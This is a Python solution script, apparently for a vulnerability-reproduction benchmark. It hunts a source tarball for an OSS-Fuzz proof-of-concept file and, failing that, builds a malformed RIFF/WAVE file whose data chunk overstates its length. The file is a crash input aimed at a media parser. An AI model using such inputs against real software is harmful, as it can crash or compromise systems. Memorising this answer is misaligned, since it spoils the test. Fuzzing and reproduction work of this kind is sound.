import os
import tarfile
import gzip


class Solution:
    def solve(self, src_path: str) -> bytes:
        data = self._extract_poc_from_tar(src_path)
        if data is not None:
            return data
        return self._fallback()

    def _extract_poc_from_tar(self, src_path: str) -> bytes | None:
        try:
            tf = tarfile.open(src_path, "r:*")
        except Exception:
            return None

        with tf:
            members = [m for m in tf.getmembers() if getattr(m, "size", 0) > 0]

            bug_id = "382816119"

            # Stage 1: files whose path mentions the exact oss-fuzz bug id
            stage1 = [m for m in members if bug_id in m.name]
            data = self._select_and_read_riff(tf, stage1)
            if data is not None:
                return data

            # Stage 2: common PoC / fuzz keywords in basename
            keywords = ("oss-fuzz", "ossfuzz", "clusterfuzz", "poc", "crash", "fuzz", "seed")
            stage2 = [
                m
                for m in members
                if any(k in os.path.basename(m.name).lower() for k in keywords)
            ]
            data = self._select_and_read_riff(tf, stage2)
            if data is not None:
                return data

            # Stage 3: any relatively small file that looks like RIFF after (optional) gzip decompression
            small_members = [m for m in members if m.size <= 4096]
            data = self._select_and_read_riff(tf, small_members)
            if data is not None:
                return data

        return None

    def _select_and_read_riff(self, tf: tarfile.TarFile, members) -> bytes | None:
        target_len = 58
        best_score = None
        best_data = None

        for m in members:
            size = getattr(m, "size", 0)
            if size <= 0 or size > 1024 * 1024:
                continue
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                raw = f.read()
                f.close()
            except Exception:
                continue

            candidate = self._maybe_get_riff_bytes(raw)
            if candidate is None:
                continue
            if len(candidate) > 2 * 1024 * 1024:
                continue

            diff = abs(len(candidate) - target_len)
            score = (diff, len(candidate))
            if best_score is None or score < best_score:
                best_score = score
                best_data = candidate

        return best_data

    def _maybe_get_riff_bytes(self, data: bytes) -> bytes | None:
        # Direct RIFF/RIFX
        if len(data) >= 12 and data[0:4] in (b"RIFF", b"RIFX"):
            return data

        # Gzip-compressed PoC
        if len(data) >= 2 and data[0:2] == b"\x1f\x8b":
            try:
                decompressed = gzip.decompress(data)
            except Exception:
                return None
            if len(decompressed) >= 12 and decompressed[0:4] in (b"RIFF", b"RIFX"):
                return decompressed

        return None

    def _fallback(self) -> bytes:
        # Construct a minimal, slightly inconsistent RIFF/WAVE file (58 bytes total)
        total_size = 58
        riff_size = total_size - 8  # RIFF size field is file size minus 8

        header = b"RIFF" + riff_size.to_bytes(4, "little") + b"WAVE"
        fmt_chunk = b"fmt " + (16).to_bytes(4, "little")

        fmt_data = (
            b"\x01\x00"  # wFormatTag = PCM
            b"\x01\x00"  # nChannels = 1
            b"\x40\x1F\x00\x00"  # nSamplesPerSec = 8000
            b"\x80\x3E\x00\x00"  # nAvgBytesPerSec = 16000
            b"\x02\x00"  # nBlockAlign = 2
            b"\x10\x00"  # wBitsPerSample = 16
        )

        # data chunk claims 32 bytes, but the file will actually provide only 14 bytes
        data_chunk_header = b"data" + (32).to_bytes(4, "little")

        current_len = len(header) + len(fmt_chunk) + len(fmt_data) + len(data_chunk_header)
        remaining = total_size - current_len
        if remaining < 0:
            remaining = 0
        data_payload = b"\x00" * remaining

        return header + fmt_chunk + fmt_data + data_chunk_header + data_payload
